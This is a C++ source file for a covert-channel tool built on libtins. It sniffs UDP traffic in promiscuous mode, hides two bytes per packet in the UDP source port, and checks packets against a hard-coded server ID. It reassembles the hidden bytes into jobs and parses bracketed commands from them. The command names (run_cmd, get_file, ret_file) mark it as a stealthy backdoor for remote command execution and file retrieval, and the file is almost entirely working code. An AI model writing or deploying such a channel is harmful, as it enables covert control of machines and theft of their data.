#include "covert_channel.h"
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include "utilities.h"

using std::cout;
using std::endl;
using std::string;
using namespace Tins;

Covert_Channel::Covert_Channel()
{
    cout << "Covert_Channel Constructor" << endl;
    cmdMap.insert( cmd_pair(CMD::run_cmd, "run_cmd") );
    cmdMap.insert( cmd_pair(CMD::ret_cmd, "ret_cmd") );
    cmdMap.insert( cmd_pair(CMD::get_file, "get_file") );
    cmdMap.insert( cmd_pair(CMD::ret_file, "ret_file") );

    server_id = "a1s2d3f4g5";
    eof_flag = "[Done]";
}


void Covert_Channel::setup() {
    string filter = "udp and dst port " + std::to_string(config.listen_port);
    SnifferConfiguration c;
    c.set_promisc_mode(true);
    c.set_immediate_mode(true);
    c.set_filter(filter);
    Sniffer sniffer(config.interface, c);
    sender.default_interface(config.interface);
    sniffer.sniff_loop(make_sniffer_handler(this, &Covert_Channel::handle));
}

bool Covert_Channel::handle(PDU& pdu) {
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    uchar_vector payload = udp.rfind_pdu<RawPDU>().payload();

    DataConverter dx;
    dx.uint16 = udp.sport();

    cout << "Received Payload: ";
    for (auto i: payload)
        cout << i;
    cout << " Hidden: " << dx.hidden.uchar_1 << dx.hidden.uchar_2 << " dx.port: " << dx.uint16 << endl;

    Address addr;
    addr.ip = ip.src_addr().to_string();
    addr.port = udp.sport();

    if(udp_recv(payload, addr))
        return true;

    return false;
}


bool Covert_Channel::udp_send(string dest_ip, int dst_port, uchar_vector hidden){
    string job_id = Utilities::random_string(10);
    string payload = server_id + job_id;
    DataConverter dc;
    while(hidden.size() > 0){
        if(hidden.size() > 1){
            dc.hidden.uchar_1 = hidden.at(0);
            dc.hidden.uchar_2 = hidden.at(1);
            hidden.erase (hidden.begin(), hidden.begin() + 2);
        }
        else
        {
            dc.hidden.uchar_1 = hidden.at(0);
            dc.hidden.uchar_2 = (unsigned char)' ';
            hidden.erase (hidden.begin(), hidden.begin() + 1);
        }
        if(hidden.size() == 0){
            payload += eof_flag;
        }
        IP pkt = IP(dest_ip) / UDP(dst_port, dc.uint16) / RawPDU(payload);
        sender.send(pkt);
        cout << "Send Payload: " << payload << " hidden: " << dc.hidden.uchar_1 << dc.hidden.uchar_2 << " dx.port: " << dc.uint16 << endl;
    }

    return true;
}


bool Covert_Channel::udp_recv(uchar_vector payload, Address src_address){
    int sid_length = 10;
    int jid_length = 10;
    if(payload.size() < 20){
        cout << "Missing Server or Job ID" << endl;
        return false;
    }

    uchar_vector payload_sid_vector(payload.begin(), payload.begin() + sid_length);
    string payload_sid_tag(payload_sid_vector.begin(), payload_sid_vector.end());

    //check if this is a valid packet
    if(payload_sid_tag == server_id){
        uchar_vector payload_jid_tag_vector(payload.begin() + sid_length, payload.begin() + sid_length + jid_length);
        string payload_jid_tag(payload_jid_tag_vector.begin(), payload_jid_tag_vector.end());

        DataConverter dc;
        dc.uint16 = src_address.port;

        bool found = false;
        // check if this is a packet for a current job
        for (auto& kv : jobs) {
            if (kv.first == payload_jid_tag){
                found = true;
                kv.second.job.push_back(dc.hidden.uchar_1);
                kv.second.job.push_back(dc.hidden.uchar_2);
                if(payload.size() >= 21){
                    cout << "payload bigger than 21: " << endl;
                    uchar_vector end_tag(payload.begin() + sid_length + jid_length, payload.begin() + sid_length + jid_length + 6);
                    string payload_end_tag(end_tag.begin(), end_tag.end());
                    if(payload_end_tag == eof_flag){
                        cout << "Finished job: : " << payload_jid_tag << endl;
                        finish_transfer(payload_jid_tag);
                    }
                }
                break;
            }
        }
        // not a current job? make a new job for it
        if(!found){
            Job j;
            j.job.push_back(dc.hidden.uchar_1);
            j.job.push_back(dc.hidden.uchar_2);
            j.address = src_address;
            jobs.insert({payload_jid_tag, j});
            cout << "Inset New Job: " << payload_jid_tag << "jobs.size(): " << jobs.size() << endl;
        }
        return true;
    }
    cout << "Incorrect ServerID" << endl;
    return false;

}

bool Covert_Channel::finish_transfer(string payload_jid_tag){

    for (auto& kv : jobs) {
        if (kv.first == payload_jid_tag){
            cout << "Print Complete job: " << payload_jid_tag << endl;
            cout << "kv.second: ";
            for (auto& i: kv.second.job)
                cout << i;
            cout << endl;

            string command_argument(kv.second.job.begin(), kv.second.job.end());
            split_command_argument_with_regex(command_argument, kv.second);

            parse_command(kv.second);


        }
    }
    return true;
}

bool Covert_Channel::split_command_argument_with_regex(const string& command_argument, Job& j){
    //Regex for looking for text between [square brackets]
    std::regex rgx("\\[(.*?)\\]");
    std::smatch match;

    cout << "match: ";
    if (std::regex_search(command_argument, match, rgx)) {
        cout << match[1] << endl;
    }
    else{
        cout << "None" << endl;
        return false;
    }

    j.command = match[1];
    cout << "Command: " << j.command << endl;
    j.argument = string(command_argument.begin() + j.command.length() + 2, command_argument.end());
    cout << "Argument: " << j.argument << endl;
    return true;
}
